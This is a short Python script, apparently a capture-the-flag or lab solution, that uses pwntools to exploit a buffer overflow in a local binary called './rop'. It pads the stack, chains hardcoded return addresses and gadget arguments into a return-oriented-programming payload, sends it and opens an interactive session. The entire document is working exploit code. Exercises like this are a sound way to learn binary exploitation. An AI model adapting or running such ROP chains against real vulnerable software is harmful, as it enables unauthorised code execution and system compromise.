#!/usr/bin/python
from pwn import *

conn = process("./rop")

base_addr_of_rop = 0xffac0478
# payload for overflow
rop = "A" * 0x1c

rop += p32(0x080485cb)

rop += p32(0x080485d8)

# ret to pop
rop += p32(0x08048806)
rop += p32(0xBAAAAAAD)

# third function
rop += p32(0x0804862b)

# fake ret addr of third
rop += p32(0x0)
rop += p32(0xDEADBAAD)

print conn.read()
conn.sendline(rop)

conn.interactive()